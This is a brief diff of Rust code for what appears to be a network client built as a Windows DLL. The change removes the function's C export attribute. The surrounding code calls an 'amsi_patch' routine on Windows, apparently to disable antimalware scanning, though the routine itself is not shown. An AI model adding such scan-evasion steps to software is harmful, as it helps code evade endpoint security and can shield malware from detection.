@@ -408,8 +408,8 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
 #[cfg(target_os = "windows")]
 const IS_DLL:bool = true;
 
-#[unsafe(export_name = "netclient")]
-pub async extern "C" fn netclient()->  c_int {
+//#[unsafe(export_name = "netclient")]
+pub async fn netclient()->  c_int {
     #[cfg(target_os = "windows")]
     amsi_patch::amsi_patch();
 
